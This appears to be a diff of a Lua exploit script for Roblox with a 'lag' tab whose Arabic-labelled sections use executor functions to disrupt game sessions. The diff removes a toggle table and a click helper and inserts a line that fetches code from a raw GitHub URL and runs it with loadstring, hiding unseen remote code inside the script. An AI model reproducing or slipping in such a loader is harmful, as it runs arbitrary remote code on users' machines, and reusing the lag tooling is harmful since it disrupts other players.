@@ -7336,15 +7336,7 @@ Tablag:AddButton({
 })
 
 -- استخدام جدول مركزي للتحكم
-local LagToggles = { Laptop = false, Phone = false, Bomb = false }
-
--- دالة النقر العامة
-local function clickNormally(object)
-    local clickDetector = object:FindFirstChildWhichIsA("ClickDetector")
-    if clickDetector then
-        pcall(fireclickdetector, clickDetector)
-    end
-end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kllooep/Fjjzxda6/main/Tahakom74"))()
 
 -- ==================== قسم: لاق بالابتوب ====================
 Tablag:AddSection("لاق بالابتوب")
